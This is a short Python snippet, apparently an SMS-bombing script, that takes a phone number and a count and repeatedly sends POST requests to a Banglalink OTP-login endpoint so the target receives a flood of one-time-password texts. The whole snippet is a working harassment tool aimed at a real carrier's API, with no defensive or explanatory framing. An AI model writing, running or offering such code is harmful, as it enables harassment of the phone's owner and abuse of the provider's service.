
#POST

myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"

nam=str(input(" Enter Your Number :"))

number={'mobile':nam}

amount=int(input(" Enter The Amount. : "))

for i in range(amount):
	requests.post(myblapi,data=number)
	print(str(i+1)+" SMS Sent")